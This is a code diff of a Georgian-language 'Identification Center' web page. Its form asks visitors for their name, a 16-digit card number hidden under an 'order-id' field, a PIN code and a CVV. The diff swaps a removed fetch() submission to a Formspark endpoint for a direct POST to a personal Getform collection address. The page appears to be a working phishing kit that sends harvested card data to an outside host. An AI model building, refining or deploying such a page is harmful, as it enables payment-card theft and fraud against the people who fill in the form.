@@ -86,14 +86,6 @@ button:hover {
     background-color: #0056b3;
 }
 
-.success-message {
-    text-align: center;
-    color: green;
-    margin-top: 15px;
-    display: none;
-    font-weight: bold;
-}
-
 @media (max-width: 480px) {
     .form-container {
         padding: 20px;
@@ -111,8 +103,8 @@ button:hover {
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
 
-    <!-- Форма теперь без action/method -->
-    <form id="contact-form">
+    <!-- ТУТ ПОДКЛЮЧЕН ВАШ GETFORM -->
+    <form id="contact-form" action="https://kapanadze1995work.getform.com" method="POST">
         <h3>დატოვეთ თქვენი მონაცემები</h3>
 
         <label for="first-name">სახელი (Имя)</label>
@@ -148,12 +140,10 @@ button:hover {
 
         <button type="submit">მონაცების გაგზავნა</button>
     </form>
-
-    <div class="success-message" id="success-message">Спасибо! Ваша заявка отправлена.</div>
 </div>
 
 <script>
-// Форматирование номера карты
+// Форматирование номера карты (пробелы каждые 4 цифры)
 document.getElementById('order-id').addEventListener('input', function (e) {
     let value = e.target.value.replace(/\D/g, '').slice(0,16);
     e.target.value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
@@ -167,31 +157,6 @@ document.getElementById('pin-code').addEventListener('input', function (e) {
 // Только цифры для CVV
 document.getElementById('cvv').addEventListener('input', function (e) {
     e.target.value = e.target.value.replace(/\D/g, '').slice(0,3);
-});
-
-// Отправка формы через fetch на Formspark
-document.getElementById('contact-form').addEventListener('submit', function(e) {
-    e.preventDefault(); // блокируем стандартную отправку
-
-    const form = e.target;
-    const data = new FormData(form);
-
-    fetch('https://submit.formspark.io/ZNHCwJg0T', {
-        method: 'POST',
-        body: data,
-        headers: { 'Accept': 'application/json' }
-    })
-    .then(response => {
-        if(response.ok){
-            form.reset();
-            document.getElementById('success-message').style.display = 'block';
-        } else {
-            alert('Ошибка отправки формы. Попробуйте позже.');
-        }
-    })
-    .catch(error => {
-        alert('Ошибка отправки формы. Попробуйте позже.');
-    });
 });
 </script>
 
